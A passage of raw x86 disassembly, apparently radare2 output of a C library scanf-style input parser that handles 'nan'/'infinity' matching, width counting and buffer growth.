mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073824
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jne case.0x806fb57.38
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80737e0
movzx ecx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xec]
mov byte [eax + 1], cl
mov eax, dword [ebp - 0xa0]
mov dword [ebp - 0xf4], 2
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80737cd
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80737bb
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x66
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807375d
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je 0x80724f2
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807374b
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073738
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073726
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80724f2
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x69
je 0x8073189
mov dword [esp + 4], edx
dec dword [ebp - 0x98]
mov edx, dword [ebp + 8]
mov dword [esp], edx
call fcn.0804e190
jmp 0x80724f2
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80736c8
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80736b5
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80736a3
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x8073645
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073632
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073620
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x69
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80735c2
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80735af
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807359d
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x74
jne case.0x806fb57.38
mov eax, dword [ebp - 0xa0]
dec eax
cmp dword [ebp - 0xa0], 1
cmovl eax, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], eax
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x807353f
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
mov eax, dword [ebp - 0xa0]
test eax, eax
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807351a
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8073508
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x79
jne case.0x806fb57.38
mov eax, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], eax
je 0x80734b1
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
jmp 0x80724f2
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x807348f
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x807348f
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807345a
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073447
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp case.0x806fb57.38
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80733f0
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80733f0
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807339c
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073389
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8073332
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8073332
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80732de
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80732cb
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8073274
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8073274
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8073220
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x807320d
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80731b6
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80731b6
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807314c
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8073139
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x80724f2
add eax, eax
mov edx, dword [ebp - 0xec]
cmp eax, 0xff
mov dword [ebp - 0xf0], eax
mov eax, 0x100
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x80730e2
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80730e2
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x807308e
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x807307b
mov eax, dword [ebp - 0xec]
sub esp, 0x410
mov dword [ebp - 0xf0], 0x100
lea edx, [esp + 0x1f]
and edx, 0xfffffff0
test eax, eax
mov dword [ebp - 0xec], edx
je 0x8073027
mov dword [esp + 8], 1
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8073027
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072fd3
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072fc0
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp case.0x806fb57.38
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test eax, eax
mov dword [var_ech], ecx
je 0x8072f6d
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08053770
jmp 0x8072f6d
mov edx, dword [var_f0h]
cmp dword [var_f4h], edx
je 0x8073a78
movzx eax, byte [var_9ch]
mov edx, dword [var_ech]
mov byte [edx], al
mov ebx, dword [var_a0h]
mov dword [var_f4h], 1
test ebx, ebx
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8073849
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073a65
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073a53
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x61
jne case.0x806fb57.38
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8073a0f
movzx ecx, byte [var_9ch]
mov eax, dword [var_ech]
mov byte [eax + 1], cl
mov ecx, dword [var_a0h]
mov dword [var_f4h], 2
test ecx, ecx
je case.0x806fb57.38
cmp dword [ebp - 0x9c], 0xffffffff
je 0x807352d
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80739ff
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80739f0
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je case.0x806fb57.38
mov ecx, dword [ebp - 0xac]
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x6e
jmp 0x807347b
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80739ca
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x80739bb
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh_2]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x807396b
mov dword [esp + 8], 1
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x807396b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073917
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073904
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test eax, eax
mov dword [var_ech], ecx
je 0x80738b1
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08053770
jmp 0x80738b1
mov eax, dword [var_a0h]
cmp dword [var_9ch], 0x2d
sete byte [var_b7h]
test eax, eax
je case.0x806fb57.38
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073cc0
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073cae
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
jbe 0x8073ca0
mov ecx, dword [var_ach]
movzx eax, byte [var_9ch]
mov edx, dword [ecx + 0x38]
mov eax, dword [edx + eax*4]
cmp eax, 0x69
je 0x8073b98
cmp eax, 0x6e
je 0x8073b98
mov ebx, dword [var_c4h]
mov eax, dword [var_a0h]
mov esi, 0x7fffffff
movzx edx, byte [ebx]
test eax, eax
cmovg esi, dword [var_a0h]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8073c00
mov ecx, dword [var_c4h]
movzx edx, byte [ecx]
test dl, dl
jne 0x8073bbf
mov edi, dword [var_a0h]
test edi, edi
jle 0x8073bb1
mov ecx, dword [var_ach]
mov dword [var_a0h], esi
mov edx, dword [ecx + 0x38]
mov esi, dword [var_a0h]
test esi, esi
jle 0x80723bc
dec dword [var_a0h]
jmp 0x80723bc
mov eax, dword [var_ach]
mov edx, dword [eax + 0x38]
jmp 0x80723bc
cmp dword [var_9ch], 0xffffffff
je 0x8073bde
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
cmp ebx, dword [var_c4h]
mov dword [var_a8h], 2
je 0x806f721
dec ebx
movzx eax, byte [ebx]
mov dword [var_9ch], eax
jmp 0x8073bbf
test esi, esi
jle 0x8073b7b
inc ebx
cmp byte [ebx], 0
je 0x8073b7f
cmp dword [var_9ch], 0xffffffff
je 0x8073c91
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8073c81
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8073c72
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x8073c6a
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [var_9ch]
jne 0x8073b7b
test esi, esi
jg 0x8073c08
jmp 0x8073b7b
movzx edx, byte [ebx]
jmp 0x8073b7b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073c45
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073c36
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8073c6a
mov eax, dword [var_ach]
mov edx, dword [eax + 0x38]
jmp 0x8073b98
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8073b0a
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8073af7
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807237f
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807236c
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072385
mov dword [var_bch_2], 0
jmp 0x8070d1d
test byte [var_a4h_2], 8
jne 0x806f69c
test byte [var_a4h_2], 2
je 0x8073d75
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073d61
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov edx, dword [var_98h_2]
mov dword [eax + 4], 0
mov dword [eax], edx
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073d4b
add eax, 4
dec edx
jne 0x8073d6d
jmp 0x8073d4b
test byte [var_a4h_2], 4
je 0x8073db9
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073da5
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov ecx, dword [var_98h_2]
mov word [eax], cx
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073d95
add eax, 4
dec edx
jne 0x8073db1
jmp 0x8073d95
test dword [var_a4h_2], 0x200
jne 0x8073dfd
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8073de9
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov edx, dword [var_98h_2]
jmp 0x8073d5a
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073ddc
add eax, 4
dec edx
jne 0x8073df5
jmp 0x8073ddc
mov edi, dword [var_fch_2]
test edi, edi
jne 0x8073e24
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
movzx ecx, byte [var_98h_2]
mov eax, dword [eax]
mov byte [eax], cl
jmp 0x806f69c
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073e14
add eax, 4
dec edx
jne 0x8073e30
jmp 0x8073e14
mov dword [var_bch_2], 8
mov dword [var_c0h], 0
jmp 0x8070d27
and dword [var_a4h_2], 0xfffffff9
mov dword [var_bch_2], 0x10
mov dword [var_c0h_2], 0
mov dword [var_e8h_2], 1
jmp 0x8070d27
test byte [var_a4h_2], 1
jne case.0x806fb57.83
test byte [var_a4h_2], 8
jne 0x8073f04
test dword [var_a4h_2], 0x100
je 0x8074150
mov eax, dword [var_fch_2]
test eax, eax
jne 0x8074135
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov eax, dword [var_dch_2]
test eax, eax
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x64
call fcn.08050fe0
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
mov dword [var_d4h_2], eax
mov edi, dword [var_d4h_2]
test edi, edi
je case.0x806fb57.38
cmp dword [var_9ch_2], 0xffffffff
je 0x807411e
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807410b
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x80740f9
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
mov ecx, dword [var_ach_2]
mov edx, dword [var_9ch_2]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x80740d8
test byte [var_a4h_2], 8
jne 0x8073faa
mov ecx, dword [var_d4h_2]
mov byte [ecx], dl
inc ecx
test dword [var_a4h_2], 0x100
mov dword [var_d4h_2], ecx
je 0x8073faa
mov edx, dword [var_dch_2]
mov eax, dword [var_e0h_2]
add eax, dword [edx]
cmp ecx, eax
je 0x807403e
mov esi, dword [var_a0h_2]
test esi, esi
jle 0x8073fc8
dec dword [var_a0h_2]
mov ebx, dword [var_a0h_2]
test ebx, ebx
jle 0x8070814
cmp dword [var_9ch_2], 0xffffffff
je 0x807402c
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807401c
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x807400d
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
jne 0x8073f56
jmp 0x8070814
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8073ffb
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8073fec
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
jmp 0x8070814
mov ebx, dword [var_e0h_2]
add ebx, ebx
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h_2], eax
je 0x8074085
mov edx, dword [var_d4h_2]
mov eax, dword [var_dch_2]
mov ecx, dword [var_e0h_2]
mov dword [eax], edx
add edx, ecx
mov dword [var_d4h_2], edx
mov dword [var_e0h_2], ebx
jmp 0x8073faa
mov ebx, dword [var_e0h_2]
mov ecx, dword [var_dch_2]
inc ebx
mov dword [var_4h], ebx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d4h_2], eax
je 0x80740c0
mov ecx, dword [var_e0h_2]
mov edx, dword [var_dch_2]
add dword [var_d4h_2], ecx
mov dword [edx], eax
jmp 0x807407a
mov ecx, dword [var_dch_2]
mov edx, dword [var_e0h_2]
mov eax, dword [ecx]
mov byte [edx + eax - 1], 0
jmp 0x80701d4
movzx eax, byte [var_9ch_2]
dec dword [var_98h_2]
mov dword [var_4h], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.0804e190
jmp 0x8070814
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8073f43
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8073f30
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8073f49
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073ebc
add eax, 4
dec edx
jne 0x8074145
jmp 0x8073ebc
mov eax, dword [var_fch_2]
test eax, eax
jne 0x807416e
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x8073ef0
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8074167
add eax, 4
dec edx
jne 0x807417a
jmp 0x8074167
mov dword [var_bch_2], 0xa
jmp 0x8073e42
mov dword [var_bch], 0x10
jmp 0x8073e42
call fcn.08048b20
cmp dword [eax], 4
jne 0x806fafc
jmp 0x806f8c6
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806faef
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806fadc
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x80741a0
or dword [var_a4h_2], 0x200
inc edx
mov dword [var_90h_2], edx
movzx ebx, byte [edx]
jmp 0x806fa64
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
cmp bl, 0x73
je 0x807421b
cmp bl, 0x53
je 0x807421b
cmp bl, 0x5b
je 0x807421b
dec edx
jmp 0x80741f2
or dword [var_a4h_2], 0x100
jmp 0x806fa64
or dword [var_a4h_2], 2
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
jmp 0x806fa64
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
cmp bl, 0x6c
je 0x8074259
or dword [var_a4h_2], 1
jmp 0x806fa64
or dword [var_a4h_2], 3
inc ecx
mov dword [var_90h_2], ecx
jmp 0x8074237
or dword [var_a4h_2], 3
mov eax, dword [var_90h]
movzx ebx, byte [eax]
jmp 0x806fa64
dec dword [var_90h]
jmp 0x8074270
mov edx, dword [var_90h_2]
jmp 0x80741f8
inc dword [var_90h_2]
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
cmp bl, 0x2a
je 0x807431c
cmp bl, 0x27
je 0x807431c
cmp bl, 0x49
je 0x807431c
movzx eax, bl
mov ecx, dword [var_a4h]
mov dword [var_a0h], 0
sub eax, 0x30
cmp eax, 9
setbe dl
or ecx, 0x40
and edx, 1
cmove ecx, dword [var_a4h]
cmp eax, 9
mov dword [var_a4h], ecx
ja 0x806fa25
mov ecx, dword [var_a0h_2]
movzx eax, bl
inc dword [var_90h_2]
lea edx, [ecx + ecx*4]
lea edx, [eax + edx*2 - 0x30]
mov eax, dword [var_90h_2]
mov dword [var_a0h_2], edx
movzx ebx, byte [eax]
movzx eax, bl
sub eax, 0x30
cmp eax, 9
jbe 0x80742e7
jmp 0x806fa1b
movsx eax, bl
inc dword [var_90h]
cmp eax, 0x2a
je 0x807436b
jg 0x807435a
cmp eax, 0x27
je 0x807434e
mov edx, dword [var_90h]
movzx ebx, byte [edx]
cmp bl, 0x2a
je 0x807431c
cmp bl, 0x27
je 0x807431c
cmp bl, 0x49
je 0x807431c
jmp 0x80742af
or dword [var_a4h_2], 0x80
jmp 0x8074331
cmp eax, 0x49
jne 0x8074331
or dword [var_a4h_2], 0x400
jmp 0x8074331
or dword [var_a4h], 8
jmp 0x8074331
mov edx, dword [var_90h]
mov dword [esp], edx
call fcn.08053400
lea ecx, [var_64h]
mov dword [var_4h], eax
mov dword [var_8h], ecx
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.080778c0
test eax, eax
mov ebx, eax
jle 0x8074454
cmp dword [var_9ch_2], 0xffffffff
je 0x8074440
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8074430
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x8074421
inc dword [var_98h_2]
mov edx, dword [var_9ch_2]
cmp edx, 0xffffffff
